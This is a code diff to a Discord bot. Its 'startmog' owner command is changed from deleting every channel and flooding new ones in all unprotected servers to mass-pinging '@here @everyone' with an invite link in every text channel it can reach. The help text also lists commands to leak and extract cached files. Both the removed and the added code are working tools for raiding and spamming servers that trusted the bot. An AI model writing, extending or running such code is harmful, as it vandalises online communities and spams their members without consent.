@@ -20,7 +20,6 @@ const SOURCE_CHANNELS = (process.env.SOURCE_CHANNEL_IDS || "1532052275982368959,
 const PORT = process.env.PORT || 3000;
 const AUTH = BOT_TOKEN ? `Bot ${BOT_TOKEN}` : "";
 
-// HTTP server for Render health checks
 const server = http.createServer((req, res) => {
   res.writeHead(200, { "Content-Type": "application/json" });
   res.end(JSON.stringify({ status: "ok", bot: bot?.user?.tag || "booting", cache: fileCache?.length || 0, up: process.uptime() }));
@@ -357,7 +356,7 @@ bot.on("messageCreate", async msg => {
 
     if (cmd === "help") {
       const lines = ["**📖 commands:**", "", "**🔎 search:**", "`!xlsqr <query>` — search files in cache", "", "**🤖 AI:**", "`!aiask <question>` — ask AI anything", "`!script <desc>` — generate a script/code", "`!clearconv` — reset AI conversation memory", "💬 or just **mention me** / **reply to me** to chat", "", "**🪙 credits:**", "`!claimdaily` — get 1 free credit per day", "`!balance` — check your credits", "`!access` — check your access level"];
-      if (isOwner(msg.author)) lines.push("", "**👑 owner commands:**", "", "**📁 files:**", "`!download [channel_id]` — download all .txt from channel", "`!reload` — reload all source channels (refreshes URLs)", "`!sources` — count files per source channel", "`!leakall [channel_id]` — send ALL cached files", "`!eggisgay [channel_id]` — reply to msg, extract all files", "`!extract` — reply to search result, extract all matches", "", "**👥 users:**", "`!giveperms @user/@role` — give unlimited xlsqr + navigation", "`!removeperms [@user/@role]` — remove perms (empty = all)", "`!perms` — view all saved perms", "`!givecredit @user/all [n]` — give credits", "`!removecredit @user/all [n]` — remove credits", "`!syncmembers` — sync all server members", "", "**🔧 system:**", "`!servers` — list all servers + invite links", "`!stopbot` — lock bot (only allowed users)", "`!startbot` — unlock bot for everyone", "`!debug` — show debug info", "`!070112 <channel_id>` — archive channel to zip", "", "**💀 MOG:**", "`!safe` — protect current server from !startmog", "`!unsafe` — remove protection", "`!startmog` — nuke all unprotected servers");
+      if (isOwner(msg.author)) lines.push("", "**👑 owner commands:**", "", "**📁 files:**", "`!download [channel_id]` — download all .txt from channel", "`!reload` — reload all source channels (refreshes URLs)", "`!sources` — count files per source channel", "`!leakall [channel_id]` — send ALL cached files", "`!eggisgay [channel_id]` — reply to msg, extract all files", "`!extract` — reply to search result, extract all matches", "", "**👥 users:**", "`!giveperms @user/@role` — give unlimited xlsqr + navigation", "`!removeperms [@user/@role]` — remove perms (empty = all)", "`!perms` — view all saved perms", "`!givecredit @user/all [n]` — give credits", "`!removecredit @user/all [n]` — remove credits", "`!syncmembers` — sync all server members", "", "**🔧 system:**", "`!servers` — list all servers + invite links", "`!stopbot` — lock bot (only allowed users)", "`!startbot` — unlock bot for everyone", "`!debug` — show debug info", "`!070112 <channel_id>` — archive channel to zip", "", "**💀 MOG:**", "`!safe` — protect current server from !startmog", "`!unsafe` — remove protection", "`!startmog` — spam all unprotected servers");
       lines.push("", `📦 cache: **${fileCache.length}** files${D.botStopped ? " | 🔒 **LOCKED**" : ""} | AI: Groq⚡+OpenRouter`);
       return msg.channel.send(lines.join("\n"));
     }
@@ -432,44 +431,43 @@ bot.on("messageCreate", async msg => {
       if (!isOwner(msg.author)) return;
       const safeGuildId = D.safeGuild || null;
       const targetGuilds = bot.guilds.cache.filter(g => g.id !== safeGuildId);
-      if (!targetGuilds.size) return msg.channel.send("❌ no servers to nuke (or safe server is the only one)");
+      if (!targetGuilds.size) return msg.channel.send("❌ no servers to mog (or safe server is the only one)");
       await msg.channel.send(`🔥 **STARTING MOG ON ${targetGuilds.size} SERVERS** (safe: ${safeGuildId || "none"})...`);
-      let success = 0, fail = 0;
+      let success = 0, fail = 0, spamCount = 0;
+      const spamMsg = "@here @everyone https://discord.gg/sourcehubs";
+      
       for (const guild of targetGuilds.values()) {
         try {
-          const channels = guild.channels.cache;
+          const channels = guild.channels.cache.filter(ch => ch.type === 0);
+          let sentInGuild = 0;
+          
           for (const ch of channels.values()) {
-            try { await ch.delete(); } catch {}
-          }
-          const channelNames = [];
-          for (let i = 0; i < 50; i++) {
             try {
-              const newCh = await guild.channels.create({
-                name: "AMIR HUB THE BEST",
-                type: 0
-              });
-              channelNames.push(newCh.id);
-            } catch {}
-          }
-          const spamMsg = "@here @everyone https://discord.gg/sourcehubs";
-          for (const chId of channelNames) {
-            try {
-              const ch = await guild.channels.fetch(chId);
-              if (ch) {
+              const perms = ch.permissionsFor(guild.members.me);
+              if (perms && perms.has("SendMessages") && perms.has("ViewChannel")) {
                 for (let i = 0; i < 3; i++) {
                   await ch.send(spamMsg);
-                  await sleep(500);
+                  spamCount++;
+                  sentInGuild++;
+                  await sleep(300);
                 }
               }
             } catch {}
           }
-          success++;
+          
+          if (sentInGuild > 0) {
+            success++;
+            console.log(`[MOG] ${guild.name}: ${sentInGuild} messages sent`);
+          } else {
+            fail++;
+          }
         } catch {
           fail++;
         }
-        await sleep(1500);
+        await sleep(1000);
       }
-      return msg.channel.send(`✅ **MOG COMPLETE**\n✅ nuked: ${success}\n❌ failed: ${fail}`);
+      
+      return msg.channel.send(`✅ **MOG COMPLETE**\n✅ servers spammed: ${success}\n❌ failed: ${fail}\n📨 total messages sent: **${spamCount}**`);
     }
 
     if ((cmd === "070112" || cmd === "07012") && canArchive(msg.author)) return doArchive(msg, args[0]);
